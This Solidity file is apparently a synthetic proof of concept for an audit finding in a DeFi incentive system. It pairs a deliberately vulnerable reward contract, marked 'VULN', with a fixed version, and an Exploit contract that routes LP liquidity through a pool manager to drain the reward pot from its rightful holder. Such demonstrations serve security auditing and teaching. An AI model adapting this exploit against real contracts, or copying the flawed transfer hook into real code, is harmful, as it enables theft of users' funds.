// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Paladin Valkyrie — an IncentivizedERC20 recycled into the pool manager
    can be claimed by anyone (Cyfrin, #61562, March 2025).
    SYNTHETIC, cheatcode-free, one block.
    transferFrom notifies the hook, which moves poolUserLiquidity from the
    LP onto the PoolManager. claim() then pays that account the reward token.
    The reward token is not the LP. N = 100e18 moves from the incentive
    contract to the manager and then to the caller. The LP holder is paid 0.
    Control reverts when the recycled IncentivizedERC20 notifies. */

interface ITokenizedHook {
    function notifyTransfer(bytes32 poolId, address from, address to, uint256 amount) external;
}

contract RewardToken {
    string public constant name = "Reward";
    string public constant symbol = "RWD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract IncentivizedERC20 is RewardToken {
    address public hook;
    bytes32 public poolId;

    constructor(address hook_, bytes32 id) {
        hook = hook_;
        poolId = id;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        ITokenizedHook(hook).notifyTransfer(poolId, from, to, amount);
        return super.transferFrom(from, to, amount);
    }
}

contract IncentiveLogic is ITokenizedHook {
    mapping(bytes32 => mapping(address => uint256)) public poolUserLiquidity;
    mapping(bytes32 => uint256) public totalLiquidity;
    mapping(address => uint256) public rewards;

    function credit(bytes32 id, address user, uint256 amount) external {
        poolUserLiquidity[id][user] += amount;
        totalLiquidity[id] += amount;
    }

    function depositRewards(address token, uint256 amount) external {
        RewardToken(token).transferFrom(msg.sender, address(this), amount);
        rewards[token] += amount;
    }

    function notifyTransfer(bytes32 id, address from, address to, uint256 amount) external {
        poolUserLiquidity[id][from] -= amount;
        // @> VULN: recycled IncentivizedERC20 liquidity is credited to `to`
        poolUserLiquidity[id][to] += amount;
    }

    function claim(bytes32 id, address token, address account, address to) external {
        uint256 liq = poolUserLiquidity[id][account];
        require(liq > 0 && liq == totalLiquidity[id], "holder");
        uint256 amt = rewards[token];
        require(amt > 0, "empty");
        rewards[token] = 0;
        RewardToken(token).transfer(to, amt);
    }
}

error RecycledToken();

contract IncentiveLogicFixed is ITokenizedHook {
    mapping(bytes32 => mapping(address => uint256)) public poolUserLiquidity;
    mapping(bytes32 => uint256) public totalLiquidity;
    mapping(address => uint256) public rewards;
    address public recycled;

    function setRecycled(address token) external {
        recycled = token;
    }

    function credit(bytes32 id, address user, uint256 amount) external {
        poolUserLiquidity[id][user] += amount;
        totalLiquidity[id] += amount;
    }

    function depositRewards(address token, uint256 amount) external {
        RewardToken(token).transferFrom(msg.sender, address(this), amount);
        rewards[token] += amount;
    }

    function notifyTransfer(bytes32 id, address from, address to, uint256 amount) external {
        if (msg.sender == recycled) revert RecycledToken();
        poolUserLiquidity[id][from] -= amount;
        poolUserLiquidity[id][to] += amount;
    }

    function claim(bytes32 id, address token, address account, address to) external {
        uint256 liq = poolUserLiquidity[id][account];
        require(liq > 0 && liq == totalLiquidity[id], "holder");
        uint256 amt = rewards[token];
        require(amt > 0, "empty");
        rewards[token] = 0;
        RewardToken(token).transfer(to, amt);
    }
}

contract PoolManager {
    function recycle(address lp, address from, uint256 amount) external {
        IncentivizedERC20(lp).transferFrom(from, address(this), amount);
    }

    function sweep(address token, address to) external {
        uint256 bal = RewardToken(token).balanceOf(address(this));
        RewardToken(token).transfer(to, bal);
    }
}

contract LpHolder {
    function approveToken(address token, address spender, uint256 amount) external {
        RewardToken(token).approve(spender, amount);
    }
}

contract Exploit {
    bytes32 public constant POOL_ID = bytes32(uint256(1));
    uint256 public constant N = 100 ether;

    RewardToken public reward;
    IncentiveLogic public logic;
    PoolManager public manager;
    IncentivizedERC20 public lp;
    LpHolder public holder;

    constructor() {
        reward = new RewardToken();
        logic = new IncentiveLogic();
        manager = new PoolManager();
        lp = new IncentivizedERC20(address(logic), POOL_ID);
        holder = new LpHolder();
    }

    function run() external {
        reward.mint(address(this), N);
        reward.approve(address(logic), N);
        logic.depositRewards(address(reward), N);
        require(reward.balanceOf(address(logic)) == N, "pot");
        require(address(reward) != address(lp), "same token");

        lp.mint(address(holder), N);
        logic.credit(POOL_ID, address(holder), N);
        holder.approveToken(address(lp), address(manager), N);

        manager.recycle(address(lp), address(holder), N);
        require(logic.poolUserLiquidity(POOL_ID, address(manager)) == N, "manager liq");
        require(logic.poolUserLiquidity(POOL_ID, address(holder)) == 0, "holder liq");

        logic.claim(POOL_ID, address(reward), address(manager), address(manager));
        require(reward.balanceOf(address(manager)) == N, "claimed other token");
        manager.sweep(address(reward), address(this));

        require(reward.balanceOf(address(this)) == N, "stole N");
        require(reward.balanceOf(address(holder)) == 0, "holder paid");
        require(logic.rewards(address(reward)) == 0, "pot left");
    }
}
